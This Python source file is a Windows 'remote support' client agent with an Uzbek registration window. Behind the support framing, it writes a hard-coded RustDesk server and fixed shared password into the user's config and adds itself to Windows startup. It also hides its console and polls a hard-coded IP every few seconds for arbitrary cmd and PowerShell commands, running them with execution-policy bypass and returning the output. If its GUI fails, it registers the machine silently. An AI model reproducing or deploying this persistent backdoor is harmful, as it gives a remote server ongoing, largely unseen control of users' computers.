#!/usr/bin/env python3
"""
UstajonSupport Client Agent v7.0
================================
Professional remote support client with:
- Modern GUI with proper sizing
- Auto RustDesk ID detection
- Background heartbeat service
- Remote command execution
- Auto startup registration
- System tray icon

Author: UstajonSupport Team
Version: 7.0.0
"""

import os
import sys
import json
import time
import uuid
import socket
import hashlib
import logging
import threading
import subprocess
import ctypes
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, Any

# =====================================================
#                    CONFIGURATION
# =====================================================

VERSION = "7.0.0"
APP_NAME = "UstajonSupport"
SERVER_URL = "http://31.220.75.75"
RUSTDESK_KEY = "YHo+N4vp+ZWP7wedLh69zCGk3aFf4935hwDKX9OdFXE="
RUSTDESK_PASSWORD = "ustajon2025"
RUSTDESK_SERVER = "31.220.75.75"

# Intervals
HEARTBEAT_INTERVAL = 10  # seconds
COMMAND_CHECK_INTERVAL = 5  # seconds

# Paths
DATA_DIR = Path.home() / ".ustajon"
DATA_FILE = DATA_DIR / "config.json"
LOG_FILE = DATA_DIR / "agent.log"

# Window dimensions - IMPORTANT: large enough to show all elements
WINDOW_WIDTH = 500
WINDOW_HEIGHT = 700

# Colors (Dark theme)
COLORS = {
    'bg': '#0d1117',
    'bg_secondary': '#161b22', 
    'bg_input': '#21262d',
    'accent': '#238636',
    'accent_hover': '#2ea043',
    'text': '#ffffff',
    'text_secondary': '#8b949e',
    'border': '#30363d',
    'success': '#238636',
    'error': '#f85149',
    'warning': '#d29922'
}

# =====================================================
#                      LOGGING
# =====================================================

def setup_logging():
    """Setup logging to file and console"""
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S',
        handlers=[
            logging.FileHandler(LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

log = setup_logging()

# =====================================================
#                 WINDOWS UTILITIES
# =====================================================

def hide_console():
    """Hide console window for background operation"""
    if sys.platform == 'win32':
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass

def is_admin():
    """Check if running as administrator"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_screen_size():
    """Get screen dimensions"""
    try:
        user32 = ctypes.windll.user32
        return user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
    except:
        return 1920, 1080

# =====================================================
#                 SYSTEM INFORMATION
# =====================================================

def get_machine_id() -> str:
    """Generate unique machine identifier"""
    try:
        info = f"{socket.gethostname()}-{uuid.getnode()}"
        return hashlib.md5(info.encode()).hexdigest()[:12].upper()
    except:
        return uuid.uuid4().hex[:12].upper()

def get_hostname() -> str:
    """Get computer hostname"""
    try:
        return socket.gethostname()
    except:
        return "Unknown"

def get_username() -> str:
    """Get current Windows username"""
    try:
        return os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
    except:
        return "Unknown"

def get_os_info() -> str:
    """Get Windows version information"""
    try:
        result = subprocess.run(
            ['wmic', 'os', 'get', 'Caption', '/value'],
            capture_output=True, text=True, timeout=15,
            creationflags=0x08000000
        )
        for line in result.stdout.split('\n'):
            if 'Caption=' in line:
                return line.split('=', 1)[1].strip()
    except:
        pass
    
    try:
        import platform
        return f"Windows {platform.release()}"
    except:
        return "Windows"

def get_ip_address() -> str:
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def get_system_info() -> Dict[str, Any]:
    """Get comprehensive system information"""
    info = {
        'hostname': get_hostname(),
        'username': get_username(),
        'os': get_os_info(),
        'ip': get_ip_address(),
        'machine_id': get_machine_id()
    }
    
    # CPU info
    try:
        result = subprocess.run(
            ['wmic', 'cpu', 'get', 'Name', '/value'],
            capture_output=True, text=True, timeout=15,
            creationflags=0x08000000
        )
        for line in result.stdout.split('\n'):
            if 'Name=' in line:
                info['cpu'] = line.split('=', 1)[1].strip()
    except:
        pass
    
    # RAM info
    try:
        result = subprocess.run(
            ['wmic', 'computersystem', 'get', 'TotalPhysicalMemory', '/value'],
            capture_output=True, text=True, timeout=15,
            creationflags=0x08000000
        )
        for line in result.stdout.split('\n'):
            if 'TotalPhysicalMemory=' in line:
                ram_bytes = int(line.split('=')[1].strip())
                info['ram_gb'] = round(ram_bytes / (1024**3), 1)
    except:
        pass
    
    return info

# =====================================================
#                  DATA PERSISTENCE
# =====================================================

def load_config() -> Dict[str, Any]:
    """Load saved configuration"""
    try:
        if DATA_FILE.exists():
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        log.error(f"Failed to load config: {e}")
    return {}

def save_config(data: Dict[str, Any]):
    """Save configuration to file"""
    try:
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        log.info("Configuration saved")
    except Exception as e:
        log.error(f"Failed to save config: {e}")

# =====================================================
#                  STARTUP MANAGEMENT
# =====================================================

def add_to_startup() -> bool:
    """Add application to Windows startup"""
    try:
        import winreg
        
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = f'pythonw.exe "{os.path.abspath(__file__)}"'
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        log.info("Added to Windows startup")
        return True
    except Exception as e:
        log.error(f"Failed to add to startup: {e}")
        return False

def remove_from_startup() -> bool:
    """Remove application from Windows startup"""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
        return True
    except:
        return False

# =====================================================
#                  RUSTDESK MANAGER
# =====================================================

class RustDeskManager:
    """Manage RustDesk configuration and ID detection"""
    
    @staticmethod
    def get_config_paths() -> list:
        """Get possible RustDesk config file paths"""
        paths = []
        
        appdata = os.environ.get('APPDATA', '')
        if appdata:
            paths.append(Path(appdata) / "RustDesk" / "config" / "RustDesk2.toml")
        
        paths.append(Path.home() / "AppData" / "Roaming" / "RustDesk" / "config" / "RustDesk2.toml")
        paths.append(Path.home() / ".config" / "rustdesk" / "RustDesk2.toml")
        
        return paths
    
    @staticmethod
    def find_rustdesk_id() -> Optional[str]:
        """Find RustDesk ID from config files"""
        for config_path in RustDeskManager.get_config_paths():
            try:
                if config_path.exists():
                    content = config_path.read_text(encoding='utf-8')
                    for line in content.split('\n'):
                        line = line.strip()
                        if line.startswith('id') and '=' in line:
                            # Parse: id = '1234567890' or id = "1234567890"
                            value = line.split('=', 1)[1].strip()
                            value = value.strip("'\"")
                            if value and len(value) >= 6 and value.isdigit():
                                log.info(f"RustDesk ID found: {value}")
                                return value
            except Exception as e:
                log.debug(f"Error reading {config_path}: {e}")
        
        # Try Windows registry
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\RustDesk", 0, winreg.KEY_READ)
            rustdesk_id, _ = winreg.QueryValueEx(key, "id")
            winreg.CloseKey(key)
            if rustdesk_id:
                log.info(f"RustDesk ID from registry: {rustdesk_id}")
                return rustdesk_id
        except:
            pass
        
        log.warning("RustDesk ID not found")
        return None
    
    @staticmethod
    def configure_server():
        """Configure RustDesk to use our server"""
        config_path = None
        appdata = os.environ.get('APPDATA', '')
        if appdata:
            config_path = Path(appdata) / "RustDesk" / "config" / "RustDesk2.toml"
        else:
            config_path = Path.home() / "AppData" / "Roaming" / "RustDesk" / "config" / "RustDesk2.toml"
        
        try:
            config_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Read existing config
            config = {}
            if config_path.exists():
                content = config_path.read_text(encoding='utf-8')
                for line in content.split('\n'):
                    line = line.strip()
                    if '=' in line and not line.startswith('#'):
                        key, val = line.split('=', 1)
                        config[key.strip()] = val.strip()
            
            # Update server settings
            config['rendezvous_server'] = f"'{RUSTDESK_SERVER}'"
            config['key'] = f"'{RUSTDESK_KEY}'"
            config['password'] = f"'{RUSTDESK_PASSWORD}'"
            config['direct-server'] = "'Y'"
            config['direct-access-port'] = "'21118'"
            
            # Write config
            with open(config_path, 'w', encoding='utf-8') as f:
                for key, val in config.items():
                    f.write(f"{key} = {val}\n")
            
            log.info("RustDesk server configured")
            return True
        except Exception as e:
            log.error(f"Failed to configure RustDesk: {e}")
            return False
    
    @staticmethod
    def is_running() -> bool:
        """Check if RustDesk is running"""
        try:
            result = subprocess.run(
                ['tasklist', '/FI', 'IMAGENAME eq rustdesk.exe'],
                capture_output=True, text=True, timeout=10,
                creationflags=0x08000000
            )
            return 'rustdesk.exe' in result.stdout.lower()
        except:
            return False
    
    @staticmethod
    def start():
        """Start RustDesk application"""
        paths = [
            Path(os.environ.get('PROGRAMFILES', '')) / "RustDesk" / "rustdesk.exe",
            Path(os.environ.get('PROGRAMFILES(X86)', '')) / "RustDesk" / "rustdesk.exe",
            Path(os.environ.get('LOCALAPPDATA', '')) / "RustDesk" / "rustdesk.exe",
        ]
        
        for path in paths:
            if path.exists():
                try:
                    subprocess.Popen(
                        [str(path), '--service'],
                        creationflags=0x08000000 | 0x00000008
                    )
                    log.info(f"RustDesk started: {path}")
                    return True
                except Exception as e:
                    log.error(f"Failed to start RustDesk: {e}")
        return False

# =====================================================
#                 COMMAND EXECUTOR
# =====================================================

class CommandExecutor:
    """Execute remote commands safely"""
    
    @staticmethod
    def run_cmd(command: str, timeout: int = 120) -> tuple:
        """Execute CMD command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                creationflags=0x08000000
            )
            output = result.stdout + result.stderr
            return True, output[:8000]
        except subprocess.TimeoutExpired:
            return False, f"Command timeout ({timeout}s)"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def run_powershell(command: str, timeout: int = 120) -> tuple:
        """Execute PowerShell command"""
        try:
            result = subprocess.run(
                ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', command],
                capture_output=True,
                text=True,
                timeout=timeout,
                creationflags=0x08000000
            )
            output = result.stdout + result.stderr
            return True, output[:8000]
        except subprocess.TimeoutExpired:
            return False, f"Command timeout ({timeout}s)"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def get_system_info_text() -> tuple:
        """Get formatted system information"""
        info = get_system_info()
        lines = [
            f"Hostname: {info.get('hostname', '-')}",
            f"Username: {info.get('username', '-')}",
            f"OS: {info.get('os', '-')}",
            f"IP: {info.get('ip', '-')}",
            f"CPU: {info.get('cpu', '-')}",
            f"RAM: {info.get('ram_gb', '-')} GB",
            f"Agent Version: {VERSION}",
            f"Machine ID: {info.get('machine_id', '-')}"
        ]
        return True, '\n'.join(lines)

# =====================================================
#                   HTTP CLIENT
# =====================================================

class HttpClient:
    """Simple HTTP client using urllib"""
    
    @staticmethod
    def post(url: str, data: dict, timeout: int = 15) -> Optional[dict]:
        """POST JSON data to URL"""
        try:
            import urllib.request
            req = urllib.request.Request(
                url,
                data=json.dumps(data).encode('utf-8'),
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return json.loads(resp.read().decode('utf-8'))
        except Exception as e:
            log.debug(f"POST error: {e}")
            return None
    
    @staticmethod
    def get(url: str, timeout: int = 15) -> Optional[Any]:
        """GET JSON data from URL"""
        try:
            import urllib.request
            req = urllib.request.Request(url, method='GET')
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return json.loads(resp.read().decode('utf-8'))
        except Exception as e:
            log.debug(f"GET error: {e}")
            return None

# =====================================================
#                    MAIN AGENT
# =====================================================

class SupportAgent:
    """Main support agent class"""
    
    def __init__(self):
        self.client_id = get_machine_id()
        self.running = True
        self.config = load_config()
        self.rustdesk_id = None
        self.is_registered = self.config.get('registered', False)
        
        log.info("=" * 60)
        log.info(f"{APP_NAME} Agent v{VERSION}")
        log.info(f"Client ID: {self.client_id}")
        log.info(f"Registered: {self.is_registered}")
        log.info("=" * 60)
    
    def initialize_rustdesk(self):
        """Initialize RustDesk"""
        log.info("Initializing RustDesk...")
        
        # Configure server
        RustDeskManager.configure_server()
        
        # Start RustDesk if not running
        if not RustDeskManager.is_running():
            log.info("Starting RustDesk...")
            RustDeskManager.start()
            time.sleep(3)
        
        # Try to get ID multiple times
        for attempt in range(15):
            self.rustdesk_id = RustDeskManager.find_rustdesk_id()
            if self.rustdesk_id:
                log.info(f"RustDesk ID acquired: {self.rustdesk_id}")
                break
            log.debug(f"Waiting for RustDesk ID (attempt {attempt + 1})...")
            time.sleep(1)
        
        if not self.rustdesk_id:
            log.warning("Could not acquire RustDesk ID")
    
    def send_heartbeat(self) -> bool:
        """Send heartbeat to server"""
        # Refresh RustDesk ID if missing
        if not self.rustdesk_id:
            self.rustdesk_id = RustDeskManager.find_rustdesk_id()
        
        data = {
            "client_id": self.client_id,
            "rustdesk_id": self.rustdesk_id or "",
            "hostname": get_hostname(),
            "os_info": get_os_info(),
            "version": VERSION,
            "name": self.config.get('name', ''),
            "phone": self.config.get('phone', ''),
            "problem": self.config.get('problem', ''),
            "local_ip": get_ip_address()
        }
        
        result = HttpClient.post(f"{SERVER_URL}/api/heartbeat", data)
        if result and result.get('success'):
            log.debug("Heartbeat sent successfully")
            return True
        return False
    
    def check_commands(self):
        """Check and execute pending commands"""
        commands = HttpClient.get(f"{SERVER_URL}/api/agent/commands?client_id={self.client_id}")
        
        if not commands:
            return
        
        for cmd in commands:
            if cmd.get('status') != 'pending':
                continue
            
            cmd_id = cmd.get('id')
            cmd_type = cmd.get('type', 'cmd')
            command = cmd.get('command', '')
            
            log.info(f"Executing command [{cmd_type}]: {command[:50]}...")
            
            # Execute based on type
            if cmd_type == 'powershell':
                success, output = CommandExecutor.run_powershell(command)
            elif cmd_type in ('sysinfo', 'system_info'):
                success, output = CommandExecutor.get_system_info_text()
            else:
                success, output = CommandExecutor.run_cmd(command)
            
            # Send result back
            result_data = {
                "client_id": self.client_id,
                "command_id": cmd_id,
                "success": success,
                "output": output
            }
            HttpClient.post(f"{SERVER_URL}/api/agent/command-result", result_data)
            log.info(f"Command result sent: {cmd_id}")
    
    def heartbeat_loop(self):
        """Background heartbeat loop"""
        while self.running:
            try:
                self.send_heartbeat()
            except Exception as e:
                log.error(f"Heartbeat error: {e}")
            time.sleep(HEARTBEAT_INTERVAL)
    
    def command_loop(self):
        """Background command check loop"""
        while self.running:
            try:
                self.check_commands()
            except Exception as e:
                log.error(f"Command check error: {e}")
            time.sleep(COMMAND_CHECK_INTERVAL)
    
    def register(self, name: str, phone: str, problem: str):
        """Register user data"""
        self.config = {
            'name': name,
            'phone': phone,
            'problem': problem,
            'registered': True,
            'registered_at': datetime.now().isoformat(),
            'client_id': self.client_id
        }
        save_config(self.config)
        self.is_registered = True
        
        # Send immediate heartbeat
        self.send_heartbeat()
        
        # Add to startup
        add_to_startup()
    
    def start_background_services(self):
        """Start background threads"""
        threading.Thread(target=self.heartbeat_loop, daemon=True, name="Heartbeat").start()
        threading.Thread(target=self.command_loop, daemon=True, name="Commands").start()
        log.info("Background services started")
    
    def run(self):
        """Main run method"""
        # Initialize RustDesk
        self.initialize_rustdesk()
        
        # If not registered, show GUI
        if not self.is_registered:
            self.show_registration_window()
        else:
            log.info("Already registered, running in background mode")
            hide_console()
        
        # Start background services
        self.start_background_services()
        
        # Keep alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            log.info("Agent stopped by user")
            self.running = False
    
    def show_registration_window(self):
        """Show the registration GUI window"""
        try:
            import tkinter as tk
            from tkinter import ttk, messagebox, font as tkfont
            
            # Create main window
            root = tk.Tk()
            root.title(f"{APP_NAME} - Texnik Yordam")
            root.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}")
            root.resizable(False, False)
            root.configure(bg=COLORS['bg'])
            
            # Center window
            root.update_idletasks()
            screen_w, screen_h = get_screen_size()
            x = (screen_w - WINDOW_WIDTH) // 2
            y = (screen_h - WINDOW_HEIGHT) // 2
            root.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}+{x}+{y}")
            
            # Custom fonts
            try:
                title_font = tkfont.Font(family='Segoe UI', size=24, weight='bold')
                subtitle_font = tkfont.Font(family='Segoe UI', size=11)
                label_font = tkfont.Font(family='Segoe UI', size=11, weight='bold')
                input_font = tkfont.Font(family='Segoe UI', size=12)
                button_font = tkfont.Font(family='Segoe UI', size=14, weight='bold')
                info_font = tkfont.Font(family='Consolas', size=14, weight='bold')
            except:
                title_font = ('TkDefaultFont', 24, 'bold')
                subtitle_font = ('TkDefaultFont', 11)
                label_font = ('TkDefaultFont', 11, 'bold')
                input_font = ('TkDefaultFont', 12)
                button_font = ('TkDefaultFont', 14, 'bold')
                info_font = ('TkFixedFont', 14, 'bold')
            
            # ===== HEADER =====
            header_frame = tk.Frame(root, bg=COLORS['bg'])
            header_frame.pack(fill='x', pady=(30, 10))
            
            # Icon
            icon_label = tk.Label(header_frame, text="🔧", font=('Segoe UI', 48), 
                                 bg=COLORS['bg'], fg=COLORS['accent'])
            icon_label.pack()
            
            # Title
            title_label = tk.Label(header_frame, text="Texnik Yordam", 
                                  font=title_font, bg=COLORS['bg'], fg=COLORS['text'])
            title_label.pack(pady=(5, 0))
            
            # Subtitle
            subtitle_label = tk.Label(header_frame, 
                text="Mutaxassis masofadan yordam berishi uchun\nquyidagi ma'lumotlarni to'ldiring",
                font=subtitle_font, bg=COLORS['bg'], fg=COLORS['text_secondary'], justify='center')
            subtitle_label.pack(pady=(5, 0))
            
            # ===== RUSTDESK INFO BOX =====
            info_frame = tk.Frame(root, bg=COLORS['bg_secondary'], highlightbackground=COLORS['border'],
                                 highlightthickness=1)
            info_frame.pack(fill='x', padx=40, pady=20)
            
            inner_info = tk.Frame(info_frame, bg=COLORS['bg_secondary'])
            inner_info.pack(fill='x', padx=15, pady=12)
            
            rustdesk_label = tk.Label(inner_info, text="🖥️ RustDesk ID", 
                                     font=label_font, bg=COLORS['bg_secondary'], fg=COLORS['text_secondary'])
            rustdesk_label.pack(anchor='w')
            
            rustdesk_id_var = tk.StringVar(value=self.rustdesk_id or "Aniqlanmoqda...")
            rustdesk_id_label = tk.Label(inner_info, textvariable=rustdesk_id_var,
                                        font=info_font, bg=COLORS['bg_secondary'], fg=COLORS['accent'])
            rustdesk_id_label.pack(anchor='w', pady=(5, 0))
            
            status_label = tk.Label(inner_info, text="✅ Tayyor ulanishga", 
                                   font=('Segoe UI', 9), bg=COLORS['bg_secondary'], fg=COLORS['success'])
            status_label.pack(anchor='w', pady=(3, 0))
            
            # ===== FORM =====
            form_frame = tk.Frame(root, bg=COLORS['bg'])
            form_frame.pack(fill='x', padx=40, pady=10)
            
            # Name field
            name_label = tk.Label(form_frame, text="👤 Ismingiz", font=label_font, 
                                 bg=COLORS['bg'], fg=COLORS['text'], anchor='w')
            name_label.pack(fill='x', pady=(0, 5))
            
            name_entry = tk.Entry(form_frame, font=input_font, bg=COLORS['bg_input'], 
                                 fg=COLORS['text'], insertbackground=COLORS['text'],
                                 relief='flat', bd=0, highlightthickness=2,
                                 highlightbackground=COLORS['border'], highlightcolor=COLORS['accent'])
            name_entry.pack(fill='x', ipady=10, pady=(0, 15))
            
            # Phone field
            phone_label = tk.Label(form_frame, text="📞 Telefon raqam", font=label_font,
                                  bg=COLORS['bg'], fg=COLORS['text'], anchor='w')
            phone_label.pack(fill='x', pady=(0, 5))
            
            phone_entry = tk.Entry(form_frame, font=input_font, bg=COLORS['bg_input'],
                                  fg=COLORS['text'], insertbackground=COLORS['text'],
                                  relief='flat', bd=0, highlightthickness=2,
                                  highlightbackground=COLORS['border'], highlightcolor=COLORS['accent'])
            phone_entry.insert(0, "+998")
            phone_entry.pack(fill='x', ipady=10, pady=(0, 15))
            
            # Problem field
            problem_label = tk.Label(form_frame, text="📝 Muammo tavsifi", font=label_font,
                                    bg=COLORS['bg'], fg=COLORS['text'], anchor='w')
            problem_label.pack(fill='x', pady=(0, 5))
            
            problem_text = tk.Text(form_frame, font=input_font, bg=COLORS['bg_input'],
                                  fg=COLORS['text'], insertbackground=COLORS['text'],
                                  relief='flat', bd=0, height=4, highlightthickness=2,
                                  highlightbackground=COLORS['border'], highlightcolor=COLORS['accent'])
            problem_text.pack(fill='x', pady=(0, 20))
            
            # ===== SUBMIT BUTTON =====
            def submit():
                name = name_entry.get().strip()
                phone = phone_entry.get().strip()
                problem = problem_text.get('1.0', 'end').strip()
                
                # Validation
                if not name or len(name) < 2:
                    messagebox.showwarning("Xatolik", "Iltimos, ismingizni kiriting!")
                    name_entry.focus()
                    return
                
                if len(phone) < 9:
                    messagebox.showwarning("Xatolik", "Iltimos, telefon raqamini to'liq kiriting!")
                    phone_entry.focus()
                    return
                
                # Register
                self.register(name, phone, problem or "Belgilanmagan")
                
                # Success message
                messagebox.showinfo("Tayyor! ✅", 
                    f"Ma'lumotlar muvaffaqiyatli yuborildi!\n\n"
                    f"RustDesk ID: {self.rustdesk_id or 'N/A'}\n"
                    f"Parol: {RUSTDESK_PASSWORD}\n\n"
                    f"Mutaxassis tez orada sizga ulanadi.\n"
                    f"Dastur fon rejimida ishlashda davom etadi.")
                
                root.destroy()
            
            submit_btn = tk.Button(form_frame, text="✅ YUBORISH", font=button_font,
                                  bg=COLORS['accent'], fg=COLORS['text'],
                                  activebackground=COLORS['accent_hover'], activeforeground=COLORS['text'],
                                  relief='flat', cursor='hand2', command=submit)
            submit_btn.pack(fill='x', ipady=12)
            
            # Hover effect
            def on_enter(e):
                submit_btn['bg'] = COLORS['accent_hover']
            def on_leave(e):
                submit_btn['bg'] = COLORS['accent']
            submit_btn.bind('<Enter>', on_enter)
            submit_btn.bind('<Leave>', on_leave)
            
            # ===== FOOTER =====
            footer_frame = tk.Frame(root, bg=COLORS['bg'])
            footer_frame.pack(fill='x', side='bottom', pady=15)
            
            version_label = tk.Label(footer_frame, text=f"v{VERSION} • UstajonSupport",
                                    font=('Segoe UI', 9), bg=COLORS['bg'], fg=COLORS['text_secondary'])
            version_label.pack()
            
            # ===== UPDATE RUSTDESK ID =====
            def update_rustdesk_id():
                if not self.rustdesk_id:
                    self.rustdesk_id = RustDeskManager.find_rustdesk_id()
                if self.rustdesk_id:
                    rustdesk_id_var.set(self.rustdesk_id)
                    status_label.config(text="✅ Tayyor ulanishga", fg=COLORS['success'])
                else:
                    status_label.config(text="⏳ RustDesk yuklanmoqda...", fg=COLORS['warning'])
                if root.winfo_exists():
                    root.after(2000, update_rustdesk_id)
            
            root.after(1000, update_rustdesk_id)
            
            # Run
            root.mainloop()
            
        except Exception as e:
            log.error(f"GUI error: {e}")
            import traceback
            traceback.print_exc()
            # Fallback - register without GUI
            self.register("Auto", "", "")

# =====================================================
#                   ENTRY POINT
# =====================================================

def main():
    """Application entry point"""
    log.info("Starting UstajonSupport Agent...")
    
    try:
        agent = SupportAgent()
        agent.run()
    except Exception as e:
        log.error(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
